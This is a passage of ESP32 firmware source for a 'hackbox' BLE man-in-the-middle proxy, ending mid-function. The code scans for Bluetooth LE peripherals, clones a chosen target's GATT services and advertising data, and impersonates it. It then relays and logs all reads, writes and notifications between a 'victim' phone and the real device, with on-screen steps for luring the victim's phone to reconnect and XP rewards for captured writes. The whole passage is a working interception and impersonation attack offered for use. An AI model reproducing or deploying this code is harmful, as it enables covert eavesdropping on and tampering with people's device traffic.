/*
    hackbox
    hackbox custom firmware

    BLE MITM Proxy ,Man-in-the-middle relay for BLE devices.
    Connects to a target BLE peripheral as a central, clones its GATT
    table, then advertises as the target. When a phone connects, all
    GATT operations are relayed and logged in real time.

    Flow:
    1. SCAN: BLE scan, select target device
    2. ENUM: Connect as central, enumerate all services/characteristics
    3. CLONE: Build local GATT server mirroring the target
    4. RELAY: Advertise as clone, relay traffic between phone and device
    5. LOG: All reads, writes, notifications logged to serial CSV

    - OLED: state display, device list, traffic log
    - Serial: structured CSV traffic log
    - Awards 10 XP per successful relay session, 5 XP per captured write
*/

#include "../include/ble_mitm.h"
#include "../include/level_system.h"
#include "../include/radio_manager.h"
#include "../include/sleep_manager.h"
#include "../include/display_mirror.h"
#include "../include/setting.h"
#include "../include/pindefs.h"

#include "esp_bt.h"
#include "esp_bt_main.h"
#include "esp_gap_ble_api.h"
#include "esp_gattc_api.h"
#include "esp_gatts_api.h"
#include "esp_bt_defs.h"
#include "esp_gatt_common_api.h"

#include <string.h>
#include <vector>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;

namespace {

// ===== Constants =====
const uint16_t GATTC_APP_ID = 0x10;
const uint16_t GATTS_APP_ID = 0x20;
const int MAX_SCAN_DEVICES = 30;
const int MAX_CHARS = 32;       // max characteristics to clone
const int MAX_LOG_LINES = 20;   // circular log buffer for display

// ===== Enums =====
enum MitmState {
    MITM_SCAN,          // scanning for targets
    MITM_SELECT,        // user selecting target
    MITM_CONNECTING,    // connecting to target
    MITM_ENUMERATING,   // discovering services/chars
    MITM_CLONING,       // building GATT server
    MITM_ADVERTISING,   // advertising as clone, waiting for victim
    MITM_RELAYING,      // active relay
    MITM_ERROR
};

// ===== Scanned Device =====
struct ScannedDevice {
    esp_bd_addr_t addr;
    esp_ble_addr_type_t addrType;
    char name[24];
    int8_t rssi;
    uint8_t advData[31];
    uint8_t advLen;
};

// ===== Cloned Characteristic =====
struct ClonedChar {
    esp_bt_uuid_t uuid;
    uint16_t remoteHandle;      // handle on real device
    uint16_t localHandle;       // handle on our GATT server
    esp_gatt_char_prop_t props;
    uint8_t lastValue[64];
    uint16_t lastValueLen;
    bool notifyEnabled;
};

// ===== Cloned Service =====
struct ClonedService {
    esp_bt_uuid_t uuid;
    uint16_t startHandle;
    uint16_t endHandle;
    uint16_t localServiceHandle;
};

// ===== Traffic Log Entry =====
struct LogEntry {
    char text[32];
};

// ===== State =====
MitmState state = MITM_SCAN;
char errorMsg[40] = {0};
bool needsRedraw = true;

// Progress indicators for the long-running async states (CONNECTING,
// ENUMERATING, CLONING, ADVERTISING). Without these the device looks
// frozen to the user while the BLE stack works through connection
// and service discovery -- which can take several seconds.
unsigned long stateEnterTime = 0;
unsigned long lastSpinnerTick = 0;
int spinnerFrame = 0;
const char* const SPINNER_FRAMES[] = {"|", "/", "-", "\\"};

// Scan state
ScannedDevice devices[MAX_SCAN_DEVICES];
int deviceCount = 0;
int selectedIdx = 0;
int scrollOffset = 0;
bool scanActive = false;
unsigned long scanStartTime = 0;

// Client (central) state
esp_gatt_if_t gattcIf = 0;
uint16_t gattcConnId = 0;
bool gattcConnected = false;
bool gattcRegistered = false;

// Enumeration
ClonedService services[8];
int serviceCount = 0;
ClonedChar chars[MAX_CHARS];
int charCount = 0;
int enumServiceIdx = 0;
bool enumDone = false;

// Server (peripheral) state
esp_gatt_if_t gattsIf = 0;
uint16_t gattsConnId = 0;
bool gattsConnected = false;
bool gattsRegistered = false;

// Target info
esp_bd_addr_t targetAddr;
esp_ble_addr_type_t targetAddrType;
char targetName[24] = {0};
uint8_t targetAdvData[31] = {0};
uint8_t targetAdvLen = 0;

// Traffic log
LogEntry logBuf[MAX_LOG_LINES];
int logHead = 0;
int logCount = 0;
int trafficCount = 0;

// Stats
int writesCaptured = 0;
int readsCaptured = 0;
int notifsCaptured = 0;

// ===== Helpers =====

void addLog(const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vsnprintf(logBuf[logHead].text, 31, fmt, args);
    logBuf[logHead].text[31] = '\0';
    va_end(args);
    logHead = (logHead + 1) % MAX_LOG_LINES;
    if (logCount < MAX_LOG_LINES) logCount++;
    needsRedraw = true;
}

void addrToStr(const esp_bd_addr_t addr, char *buf) {
    snprintf(buf, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);
}

void hexToStr(const uint8_t *data, int len, char *buf, int bufSize) {
    int pos = 0;
    int maxBytes = (bufSize - 1) / 3;
    if (len < maxBytes) maxBytes = len;
    for (int i = 0; i < maxBytes; i++) {
        if (pos + 3 >= bufSize) break;
        snprintf(buf + pos, bufSize - pos, "%02X ", data[i]);
        pos += 3;
    }
    if (pos > 0 && buf[pos - 1] == ' ') buf[pos - 1] = '\0';
    else buf[pos] = '\0';
}

// Format a BLE UUID as a hex string for serial emission. 16-bit SIG UUIDs
// come out like "2A19"; 32-bit like "12345678"; 128-bit in canonical
// 8-4-4-4-12 form so the web UI can look them up against the Bluetooth
// SIG assigned-numbers table directly.
void formatUuid(const esp_bt_uuid_t *u, char *buf, int bufSize) {
    if (!u || !buf || bufSize < 1) return;
    if (u->len == ESP_UUID_LEN_16) {
        snprintf(buf, bufSize, "%04X", u->uuid.uuid16);
    } else if (u->len == ESP_UUID_LEN_32) {
        snprintf(buf, bufSize, "%08X", u->uuid.uuid32);
    } else if (u->len == ESP_UUID_LEN_128) {
        // ESP-IDF stores 128-bit UUIDs little-endian. Emit big-endian
        // canonical form so the web UI can string-match directly.
        const uint8_t *b = u->uuid.uuid128;
        snprintf(buf, bufSize,
                 "%02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
                 b[15], b[14], b[13], b[12],
                 b[11], b[10],
                 b[9],  b[8],
                 b[7],  b[6],
                 b[5],  b[4],  b[3], b[2], b[1], b[0]);
    } else {
        snprintf(buf, bufSize, "?");
    }
}

int findCharByLocalHandle(uint16_t handle) {
    for (int i = 0; i < charCount; i++) {
        if (chars[i].localHandle == handle) return i;
    }
    return -1;
}

int findCharByRemoteHandle(uint16_t handle) {
    for (int i = 0; i < charCount; i++) {
        if (chars[i].remoteHandle == handle) return i;
    }
    return -1;
}

void setError(const char *msg) {
    strncpy(errorMsg, msg, 39);
    errorMsg[39] = '\0';
    state = MITM_ERROR;
    needsRedraw = true;
}

// ===== Advertising Params (declared before callbacks) =====

esp_ble_adv_params_t advParams = {
    .adv_int_min        = 0x20,
    .adv_int_max        = 0x40,
    .adv_type           = ADV_TYPE_IND,
    .own_addr_type      = BLE_ADDR_TYPE_PUBLIC,
    .peer_addr          = {0},
    .peer_addr_type     = BLE_ADDR_TYPE_PUBLIC,
    .channel_map        = ADV_CHNL_ALL,
    .adv_filter_policy  = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
};

// ===== GAP Callback =====

void gapCallback(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param) {
    switch (event) {
        case ESP_GAP_BLE_SCAN_RESULT_EVT: {
            if (state != MITM_SCAN) break;
            if (param->scan_rst.search_evt == ESP_GAP_SEARCH_INQ_RES_EVT) {
                if (deviceCount >= MAX_SCAN_DEVICES) break;

                // Deduplicate by address
                for (int i = 0; i < deviceCount; i++) {
                    if (memcmp(devices[i].addr, param->scan_rst.bda, 6) == 0) {
                        devices[i].rssi = param->scan_rst.rssi;
                        return;
                    }
                }

                ScannedDevice &dev = devices[deviceCount];
                memcpy(dev.addr, param->scan_rst.bda, 6);
                dev.addrType = param->scan_rst.ble_addr_type;
                dev.rssi = param->scan_rst.rssi;
                dev.name[0] = '\0';

                // Copy raw adv data for cloning later
                dev.advLen = (param->scan_rst.adv_data_len > 31) ? 31 : param->scan_rst.adv_data_len;
                memcpy(dev.advData, param->scan_rst.ble_adv, dev.advLen);

                // Extract name from adv data
                uint8_t *advName = esp_ble_resolve_adv_data(
                    param->scan_rst.ble_adv,
                    ESP_BLE_AD_TYPE_NAME_CMPL,
                    &dev.advLen);
                if (!advName) {
                    advName = esp_ble_resolve_adv_data(
                        param->scan_rst.ble_adv,
                        ESP_BLE_AD_TYPE_NAME_SHORT,
                        &dev.advLen);
                }
                if (advName && dev.advLen > 0) {
                    int copyLen = (dev.advLen > 23) ? 23 : dev.advLen;
                    memcpy(dev.name, advName, copyLen);
                    dev.name[copyLen] = '\0';
                }

                // Restore actual adv length
                dev.advLen = (param->scan_rst.adv_data_len > 31) ? 31 : param->scan_rst.adv_data_len;
                memcpy(dev.advData, param->scan_rst.ble_adv, dev.advLen);

                deviceCount++;
                needsRedraw = true;
            }
            if (param->scan_rst.search_evt == ESP_GAP_SEARCH_INQ_CMPL_EVT) {
                scanActive = false;
                state = MITM_SELECT;
                needsRedraw = true;
            }
            break;
        }

        case ESP_GAP_BLE_ADV_START_COMPLETE_EVT: {
            if (param->adv_start_cmpl.status == ESP_BT_STATUS_SUCCESS) {
                addLog("Advertising as clone");
            } else {
                setError("Adv start failed");
            }
            break;
        }

        default:
            break;
    }
}

// ===== GATT Client Callback (central side) =====

void gattcCallback(esp_gattc_cb_event_t event, esp_gatt_if_t gattc_if,
                    esp_ble_gattc_cb_param_t *param) {
    switch (event) {
        case ESP_GATTC_REG_EVT: {
            if (param->reg.status == ESP_GATT_OK) {
                gattcIf = gattc_if;
                gattcRegistered = true;
            }
            break;
        }

        case ESP_GATTC_OPEN_EVT: {
            if (param->open.status == ESP_GATT_OK) {
                gattcConnId = param->open.conn_id;
                gattcConnected = true;
                addLog("Connected to target");
                addLog("Discovering services...");
                state = MITM_ENUMERATING;
                stateEnterTime = millis();
                needsRedraw = true;
                // Start service discovery
                esp_ble_gattc_search_service(gattcIf, gattcConnId, NULL);
            } else {
                setError("Connect failed");
            }
            break;
        }

        case ESP_GATTC_SEARCH_RES_EVT: {
            // Found a service
            if (serviceCount < 8) {
                ClonedService &svc = services[serviceCount];
                memcpy(&svc.uuid, &param->search_res.srvc_id.uuid, sizeof(esp_bt_uuid_t));
                svc.startHandle = param->search_res.start_handle;
                svc.endHandle = param->search_res.end_handle;
                serviceCount++;
            }
            break;
        }

        case ESP_GATTC_SEARCH_CMPL_EVT: {
            addLog("Found %d services", serviceCount);
            // Now enumerate characteristics for each service
            enumServiceIdx = 0;
            if (serviceCount > 0) {
                uint16_t count = 0;
                esp_gatt_status_t status = esp_ble_gattc_get_attr_count(
                    gattcIf, gattcConnId, ESP_GATT_DB_CHARACTERISTIC,
                    services[0].startHandle, services[0].endHandle, 0, &count);
                if (status == ESP_GATT_OK && count > 0) {
                    esp_gattc_char_elem_t *charResult = (esp_gattc_char_elem_t *)malloc(sizeof(esp_gattc_char_elem_t) * count);
                    if (charResult) {
                        status = esp_ble_gattc_get_all_char(
                            gattcIf, gattcConnId,
                            services[0].startHandle, services[0].endHandle,
                            charResult, &count, 0);
                        if (status == ESP_GATT_OK) {
                            for (uint16_t i = 0; i < count && charCount < MAX_CHARS; i++) {
                                ClonedChar &cc = chars[charCount];
                                memcpy(&cc.uuid, &charResult[i].uuid, sizeof(esp_bt_uuid_t));
                                cc.remoteHandle = charResult[i].char_handle;
                                cc.props = charResult[i].properties;
                                cc.lastValueLen = 0;
                                cc.notifyEnabled = false;
                                cc.localHandle = 0;
                                charCount++;
                            }
                        }
                        free(charResult);
                    }
                }

                // Move to next service
                enumServiceIdx = 1;
                while (enumServiceIdx < serviceCount) {
                    count = 0;
                    esp_ble_gattc_get_attr_count(
                        gattcIf, gattcConnId, ESP_GATT_DB_CHARACTERISTIC,
                        services[enumServiceIdx].startHandle,
                        services[enumServiceIdx].endHandle, 0, &count);
                    if (count > 0) {
                        esp_gattc_char_elem_t *cr = (esp_gattc_char_elem_t *)malloc(sizeof(esp_gattc_char_elem_t) * count);
                        if (cr) {
                            esp_ble_gattc_get_all_char(
                                gattcIf, gattcConnId,
                                services[enumServiceIdx].startHandle,
                                services[enumServiceIdx].endHandle,
                                cr, &count, 0);
                            for (uint16_t i = 0; i < count && charCount < MAX_CHARS; i++) {
                                ClonedChar &cc = chars[charCount];
                                memcpy(&cc.uuid, &cr[i].uuid, sizeof(esp_bt_uuid_t));
                                cc.remoteHandle = cr[i].char_handle;
                                cc.props = cr[i].properties;
                                cc.lastValueLen = 0;
                                cc.notifyEnabled = false;
                                cc.localHandle = 0;
                                charCount++;
                            }
                            free(cr);
                        }
                    }
                    enumServiceIdx++;
                }

                addLog("Found %d chars total", charCount);
                addLog("Building clone GATT...");
                enumDone = true;
                state = MITM_CLONING;
                stateEnterTime = millis();
                needsRedraw = true;

                // Register for notifications on all notify-capable chars
                for (int i = 0; i < charCount; i++) {
                    if (chars[i].props & ESP_GATT_CHAR_PROP_BIT_NOTIFY) {
                        esp_ble_gattc_register_for_notify(gattcIf, targetAddr, chars[i].remoteHandle);
                    }
                }
            } else {
                setError("No services found");
            }
            break;
        }

        case ESP_GATTC_NOTIFY_EVT: {
            // Notification from real device -> forward to victim phone
            int idx = findCharByRemoteHandle(param->notify.handle);
            if (idx >= 0) {
                // Store value
                uint16_t copyLen = (param->notify.value_len > 64) ? 64 : param->notify.value_len;
                memcpy(chars[idx].lastValue, param->notify.value, copyLen);
                chars[idx].lastValueLen = copyLen;

                notifsCaptured++;
                trafficCount++;

                // Log it
                char hexStr[16];
                hexToStr(param->notify.value, (copyLen > 5) ? 5 : copyLen, hexStr, sizeof(hexStr));
                addLog("N> h%04X %s", param->notify.handle, hexStr);

                // Serial CSV
                char fullHex[130];
                hexToStr(param->notify.value, copyLen, fullHex, sizeof(fullHex));
                Serial.printf("NOTIFY,%lu,0x%04X,%d,%s\n",
                    millis(), param->notify.handle, copyLen, fullHex);

                // Forward to victim if connected
                if (gattsConnected && chars[idx].localHandle != 0) {
                    esp_ble_gatts_send_indicate(
                        gattsIf, gattsConnId, chars[idx].localHandle,
                        copyLen, param->notify.value, false);
                }
            }
            break;
        }

        case ESP_GATTC_READ_CHAR_EVT: {
            // Read response from real device
            if (param->read.status == ESP_GATT_OK) {
                int idx = findCharByRemoteHandle(param->read.handle);
                if (idx >= 0) {
                    uint16_t copyLen = (param->read.value_len > 64) ? 64 : param->read.value_len;
                    memcpy(chars[idx].lastValue, param->read.value, copyLen);
                    chars[idx].lastValueLen = copyLen;

                    readsCaptured++;
                    trafficCount++;

                    char hexStr[16];
                    hexToStr(param->read.value, (copyLen > 5) ? 5 : copyLen, hexStr, sizeof(hexStr));
                    addLog("R< h%04X %s", param->read.handle, hexStr);

                    char fullHex[130];
                    hexToStr(param->read.value, copyLen, fullHex, sizeof(fullHex));
                    Serial.printf("READ_RSP,%lu,0x%04X,%d,%s\n",
                        millis(), param->read.handle, copyLen, fullHex);
                }
            }
            break;
        }

        case ESP_GATTC_DISCONNECT_EVT: {
            gattcConnected = false;
            addLog("Target disconnected");
            if (state == MITM_RELAYING) {
                setError("Target dropped");
            }
            break;
        }

        default:
            break;
    }
}

// ===== GATT Server Callback (peripheral side) =====

bool serverCreating = false;
int serverSvcIdx = 0;
int serverCharIdx = 0;

void buildNextService();

void gattsCallback(esp_gatts_cb_event_t event, esp_gatt_if_t gatts_if,
                   esp_ble_gatts_cb_param_t *param) {
    switch (event) {
        case ESP_GATTS_REG_EVT: {
            if (param->reg.status == ESP_GATT_OK) {
                gattsIf = gatts_if;
                gattsRegistered = true;
                // Start building cloned services
                if (state == MITM_CLONING && serviceCount > 0) {
                    serverSvcIdx = 0;
                    serverCharIdx = 0;
                    buildNextService();
                }
            }
            break;
        }

        case ESP_GATTS_CREATE_EVT: {
            if (param->create.status == ESP_GATT_OK && serverSvcIdx < serviceCount) {
                services[serverSvcIdx].localServiceHandle = param->create.service_handle;
                esp_ble_gatts_start_service(param->create.service_handle);

                // Add chars for this service
                for (int i = 0; i < charCount; i++) {
                    // Match char to service by handle range
                    if (chars[i].remoteHandle >= services[serverSvcIdx].startHandle &&
                        chars[i].remoteHandle <= services[serverSvcIdx].endHandle) {

                        esp_gatt_perm_t perm = ESP_GATT_PERM_READ | ESP_GATT_PERM_WRITE;
                        esp_attr_value_t charVal = {
                            .attr_max_len = 64,
                            .attr_len = 0,
                            .attr_value = nullptr
                        };
                        esp_ble_gatts_add_char(
                            param->create.service_handle,
                            &chars[i].uuid, perm, chars[i].props, &charVal, NULL);
                    }
                }

                // Next service
                serverSvcIdx++;
                if (serverSvcIdx < serviceCount) {
                    buildNextService();
                }
            }
            break;
        }

        case ESP_GATTS_ADD_CHAR_EVT: {
            if (param->add_char.status == ESP_GATT_OK) {
                // Find which cloned char this matches and store local handle
                for (int i = 0; i < charCount; i++) {
                    if (chars[i].localHandle == 0 &&
                        chars[i].uuid.len == param->add_char.char_uuid.len &&
                        memcmp(&chars[i].uuid.uuid, &param->add_char.char_uuid.uuid,
                               chars[i].uuid.len) == 0) {
                        chars[i].localHandle = param->add_char.attr_handle;
                        break;
                    }
                }
            }
            break;
        }

        case ESP_GATTS_CONNECT_EVT: {
            gattsConnId = param->connect.conn_id;
            gattsConnected = true;
            state = MITM_RELAYING;
            stateEnterTime = millis();
            addLog("Victim connected!");
            addLog("Relaying W=write R=read");
            addLog("N=notify. Hex on serial");
            addLog("115200 8N1");
            addXP(10);
            needsRedraw = true;

            char addrStr[18];
            addrToStr(param->connect.remote_bda, addrStr);
            Serial.printf("# VICTIM CONNECTED: %s\n", addrStr);
            break;
        }

        case ESP_GATTS_DISCONNECT_EVT: {
            gattsConnected = false;
            addLog("Victim disconnected");
            // Re-advertise
            if (state == MITM_RELAYING) {
                state = MITM_ADVERTISING;
                stateEnterTime = millis();
                esp_ble_gap_start_advertising(&advParams);
                needsRedraw = true;
            }
            break;
        }

        case ESP_GATTS_READ_EVT: {
            // Victim phone is reading a characteristic
            // Forward read to real device, respond with cached value for now
            int idx = findCharByLocalHandle(param->read.handle);
            if (idx >= 0) {
                // Forward read to real device
                if (gattcConnected) {
                    esp_ble_gattc_read_char(gattcIf, gattcConnId,
                        chars[idx].remoteHandle, ESP_GATT_AUTH_REQ_NONE);
                }

                // Respond with cached value immediately
                esp_gatt_rsp_t rsp;
                memset(&rsp, 0, sizeof(rsp));
                rsp.attr_value.handle = param->read.handle;
                rsp.attr_value.len = chars[idx].lastValueLen;
                if (chars[idx].lastValueLen > 0) {
                    memcpy(rsp.attr_value.value, chars[idx].lastValue, chars[idx].lastValueLen);
                }
                esp_ble_gatts_send_response(gattsIf, param->read.conn_id,
                    param->read.trans_id, ESP_GATT_OK, &rsp);

                readsCaptured++;
                trafficCount++;

                char hexStr[16];
                hexToStr(chars[idx].lastValue,
                    (chars[idx].lastValueLen > 5) ? 5 : chars[idx].lastValueLen,
                    hexStr, sizeof(hexStr));
                addLog("R> h%04X %s", chars[idx].remoteHandle, hexStr);
            } else {
                // Unknown handle, send empty response
                esp_gatt_rsp_t rsp;
                memset(&rsp, 0, sizeof(rsp));
                rsp.attr_value.handle = param->read.handle;
                esp_ble_gatts_send_response(gattsIf, param->read.conn_id,
                    param->read.trans_id, ESP_GATT_OK, &rsp);
            }
            break;
        }

        case ESP_GATTS_WRITE_EVT: {
            // Victim phone is writing to a characteristic
            int idx = findCharByLocalHandle(param->write.handle);
            if (idx >= 0) {
                writesCaptured++;
                trafficCount++;
                addXP(5);

                // Log the write
                uint16_t len = (param->write.len > 64) ? 64 : param->write.len;
                char hexStr[16];
                hexToStr(param->write.value, (len > 5) ? 5 : len, hexStr, sizeof(hexStr));
                addLog("W> h%04X %s", chars[idx].remoteHandle, hexStr);

                char fullHex[130];
                hexToStr(param->write.value, len, fullHex, sizeof(fullHex));
                Serial.printf("WRITE,%lu,0x%04X,%d,%s\n",
                    millis(), chars[idx].remoteHandle, len, fullHex);

                // Forward write to real device
                if (gattcConnected) {
                    esp_ble_gattc_write_char(
                        gattcIf, gattcConnId,
                        chars[idx].remoteHandle,
                        len, (uint8_t *)param->write.value,
                        ESP_GATT_WRITE_TYPE_RSP,
                        ESP_GATT_AUTH_REQ_NONE);
                }

                // Cache value
                memcpy(chars[idx].lastValue, param->write.value, len);
                chars[idx].lastValueLen = len;
            }

            // Send write response if needed
            if (param->write.need_rsp) {
                esp_ble_gatts_send_response(gattsIf, param->write.conn_id,
                    param->write.trans_id, ESP_GATT_OK, NULL);
            }
            break;
        }

        default:
            break;
    }
}

void buildNextService() {
    if (serverSvcIdx >= serviceCount) return;

    esp_gatt_srvc_id_t svcId;
    svcId.is_primary = true;
    memcpy(&svcId.id.uuid, &services[serverSvcIdx].uuid, sizeof(esp_bt_uuid_t));
    svcId.id.inst_id = 0;

    // Count chars in this service to size the handle table
    int numHandles = 2; // service decl + end
    for (int i = 0; i < charCount; i++) {
        if (chars[i].remoteHandle >= services[serverSvcIdx].startHandle &&
            chars[i].remoteHandle <= services[serverSvcIdx].endHandle) {
            numHandles += 3; // char decl + value + possibly CCCD
        }
    }

    esp_ble_gatts_create_service(gattsIf, &svcId, numHandles);
}

void startAdvertising() {
    // Clone the target's advertisement data
    esp_ble_gap_config_adv_data_raw(targetAdvData, targetAdvLen);
    esp_ble_gap_start_advertising(&advParams);
    state = MITM_ADVERTISING;
    stateEnterTime = millis();

    // Dump the enumerated services and the local-handle -> UUID mapping
    // to serial so ck42x.com/hackbox/mitm-capture can build a GATT tree
    // and decode handle references against the Bluetooth SIG assigned-
    // numbers table. Emitted once at cloning completion -- static over
    // the life of the session.
    Serial.println("# GATT_BEGIN");
    for (int i = 0; i < serviceCount; i++) {
        char uuidStr[40];
        formatUuid(&services[i].uuid, uuidStr, sizeof(uuidStr));
        Serial.printf("# SVC idx=%d uuid=%s range=0x%04X-0x%04X\n",
                      i, uuidStr,
                      services[i].startHandle, services[i].endHandle);
    }
    for (int i = 0; i < charCount; i++) {
        if (chars[i].localHandle == 0) continue;  // skip failed clones
        char uuidStr[40];
        formatUuid(&chars[i].uuid, uuidStr, sizeof(uuidStr));
        Serial.printf("# CHAR h=0x%04X rh=0x%04X uuid=%s props=0x%02X\n",
                      chars[i].localHandle, chars[i].remoteHandle,
                      uuidStr, chars[i].props);
    }
    Serial.println("# GATT_END");

    // Action-oriented guidance so the user knows exactly what they need
    // to do next on their phone to actually see the MITM relay happen.
    addLog("Clone is live");
    addLog("On victim's phone:");
    addLog(" 1. Open BLE settings");
    addLog(" 2. Forget real target");
    addLog(" 3. Scan & connect");
    needsRedraw = true;
}

// ===== BLE Scan =====

esp_ble_scan_params_t scanParams = {
    .scan_type          = BLE_SCAN_TYPE_ACTIVE,
    .own_addr_type      = BLE_ADDR_TYPE_PUBLIC,
    .scan_filter_policy = BLE_SCAN_FILTER_ALLOW_ALL,
    .scan_interval      = 0x80,
    .scan_window        = 0x60,
    .scan_duplicate     = BLE_SCAN_DUPLICATE_DISABLE,
};

// ===== Display =====

void drawScanView() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);
    u8g2.drawStr(0, 8, "BLE MITM - Scanning...");
    u8g2.drawHLine(0, 10, 128);

    // Brief purpose hint so first-time users know what the tool does
    // before they even pick a target.
    u8g2.drawStr(0, 20, "Intercept BLE traffic");
    u8g2.drawStr(0, 28, "between a device and");
    u8g2.drawStr(0, 36, "its phone app.");

    char countLine[24];
    snprintf(countLine, sizeof(countLine), "Devices: %d", deviceCount);
    u8g2.drawStr(0, 50, countLine);

    u8g2.drawStr(0, 62, "Wait for scan...");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

void drawSelectView() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);

    char header[32];
    snprintf(header, sizeof(header), "Select Target  %d/%d", selectedIdx + 1, deviceCount);
    u8g2.drawStr(0, 8, header);
    u8g2.drawHLine(0, 10, 128);

    int displayRows = 5;
    for (int i = 0; i < displayRows; i++) {
        int idx = scrollOffset + i;
        if (idx >= deviceCount) break;

        const ScannedDevice &dev = devices[idx];
        char line[28];
        if (dev.name[0]) {
            snprintf(line, sizeof(line), "%c%.14s %d",
                     (idx == selectedIdx) ? '>' : ' ',
                     dev.name, dev.rssi);
        } else {
            char addrShort[9];
            snprintf(addrShort, sizeof(addrShort), "%02X%02X%02X",
                     dev.addr[3], dev.addr[4], dev.addr[5]);
            snprintf(line, sizeof(line), "%c%s %d",
                     (idx == selectedIdx) ? '>' : ' ',
                     addrShort, dev.rssi);
        }
        u8g2.drawStr(0, 20 + (i * 8), line);
    }

    u8g2.drawStr(0, 62, "U/D=Scroll R=Select");
    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

void drawStatusView() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);

    // State header. For long-running states we append elapsed seconds
    // and a spinner frame so the user can see the device is still alive
    // while BLE connection/enumeration proceeds in the background.
    const char *stateStr = "???";
    bool showSpinner = false;
    switch (state) {
        case MITM_CONNECTING:  stateStr = "Connecting";    showSpinner = true; break;
        case MITM_ENUMERATING: stateStr = "Enumerating";   showSpinner = true; break;
        case MITM_CLONING:     stateStr = "Cloning GATT";  showSpinner = true; break;
        case MITM_ADVERTISING: stateStr = "Await victim";  showSpinner = true; break;
        case MITM_RELAYING:    stateStr = "RELAYING";      break;
        case MITM_ERROR:       stateStr = "ERROR";         break;
        default: break;
    }

    char header[36];
    if (showSpinner) {
        unsigned long elapsed = (stateEnterTime > 0)
            ? (millis() - stateEnterTime) / 1000
            : 0;
        snprintf(header, sizeof(header), "MITM:%s %lus %s",
                 stateStr, elapsed, SPINNER_FRAMES[spinnerFrame & 3]);
    } else {
        snprintf(header, sizeof(header), "MITM: %s", stateStr);
    }
    u8g2.drawStr(0, 8, header);
    u8g2.drawHLine(0, 10, 128);

    if (state == MITM_RELAYING) {
        // Show traffic stats
        char statsLine[32];
        snprintf(statsLine, sizeof(statsLine), "W:%d R:%d N:%d T:%d",
                 writesCaptured, readsCaptured, notifsCaptured, trafficCount);
        u8g2.drawStr(0, 20, statsLine);
        u8g2.drawHLine(0, 22, 128);

        // Show last few log entries
        int startLine = (logCount > 4) ? logCount - 4 : 0;
        for (int i = 0; i < 4; i++) {
            int logIdx = (logHead - logCount + startLine + i + MAX_LOG_LINES) % MAX_LOG_LINES;
            if (startLine + i >= logCount) break;
            u8g2.drawStr(0, 32 + (i * 8), logBuf[logIdx].text);
        }
    } else if (state == MITM_ERROR) {
        u8g2.drawStr(0, 30, errorMsg);
        u8g2.drawStr(0, 62, "L=Exit");
    } else {
        // Show log entries
        int startLine = (logCount > 5) ? logCount - 5 : 0;
        for (int i = 0; i < 5; i++) {
            int logIdx = (logHead - logCount + startLine + i + MAX_LOG_LINES) % MAX_LOG_LINES;
            if (startLine + i >= logCount) break;
            u8g2.drawStr(0, 20 + (i * 8), logBuf[logIdx].text);
        }
    }

    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

} // namespace

// ===== Public API =====

void bleMitmSetup() {
    state = MITM_SCAN;
    deviceCount = 0;
    selectedIdx = 0;
    scrollOffset = 0;
    scanActive = false;
    needsRedraw = true;
    gattcConnected = false;
    gattsConnected = false;
    gattcRegistered = false;
    gattsRegistered = false;
    serviceCount = 0;
    charCount = 0;
    enumDone = false;
    logHead = 0;
    logCount = 0;
    trafficCount = 0;
    writesCaptured = 0;
    readsCaptured = 0;
    notifsCaptured = 0;
    serverSvcIdx = 0;
    serverCharIdx = 0;
    errorMsg[0] = '\0';
    stateEnterTime = 0;
    lastSpinnerTick = 0;
    spinnerFrame = 0;

    memset(devices, 0, sizeof(devices));
    memset(services, 0, sizeof(services));
    memset(chars, 0, sizeof(chars));
    memset(logBuf, 0, sizeof(logBuf));
    memset(targetAddr, 0, sizeof(targetAddr));

    if (!initBLE()) {
        setError("BLE init failed");
        return;
    }

    esp_ble_gap_register_callback(gapCallback);
    esp_ble_gattc_register_callback(gattcCallback);
    esp_ble_gatts_register_callback(gattsCallback);

    // Register GATT client app
    esp_ble_gattc_app_register(GATTC_APP_ID);

    // Set MTU
    esp_ble_gatt_set_local_mtu(200);

    // Start scan
    esp_ble_gap_set_scan_params(&scanParams);
    esp_ble_gap_start_scanning(8); // 8 seconds
    scanActive = true;
    scanStartTime = millis();

    Serial.println();
    Serial.println("# hackbox BLE MITM Proxy v1.0");
    Serial.println("# Scanning for BLE devices...");
    Serial.println("# type,timestamp_ms,handle,length,hex_data");

    pinMode(BUTTON_PIN_UP, INPUT_PULLUP);
    pinMode(BUTTON_PIN_DOWN, INPUT_PULLUP);
    pinMode(BUTTON_PIN_LEFT, INPUT_PULLUP);
    pinMode(BUTTON_PIN_RIGHT, INPUT_PULLUP);

    drawScanView();
}

void bleMitmLoop() {
    // LEFT is owned by the framework (global app-exit trigger in runApp()).
    // We can't observe a LEFT press here without also being torn down on
    // the same frame, so don't read it ,any state transition triggered
    // here would be wasted work (and in the ERROR path, started a BLE
    // scan that immediately leaked into cleanup).
    static bool upPrev = false, downPrev = false;
    static bool rightPrev = false;
    bool upNow = digitalRead(BUTTON_PIN_UP) == LOW;
    bool downNow = digitalRead(BUTTON_PIN_DOWN) == LOW;
    bool rightNow = digitalRead(BUTTON_PIN_RIGHT) == LOW;

    switch (state) {
        case MITM_SCAN: {
            // Just wait for scan to complete (handled in GAP callback)
            if (needsRedraw) {
                needsRedraw = false;
                drawScanView();
            }
            break;
        }

        case MITM_SELECT: {
            if (upNow && !upPrev) {
                if (selectedIdx > 0) {
                    selectedIdx--;
                    if (selectedIdx < scrollOffset) scrollOffset = selectedIdx;
                    needsRedraw = true;
                }
                delay(150);
            }
            if (downNow && !downPrev) {
                if (selectedIdx < deviceCount - 1) {
                    selectedIdx++;
                    if (selectedIdx >= scrollOffset + 5) scrollOffset = selectedIdx - 4;
                    needsRedraw = true;
                }
                delay(150);
            }
            if (rightNow && !rightPrev && deviceCount > 0) {
                // Select target and connect
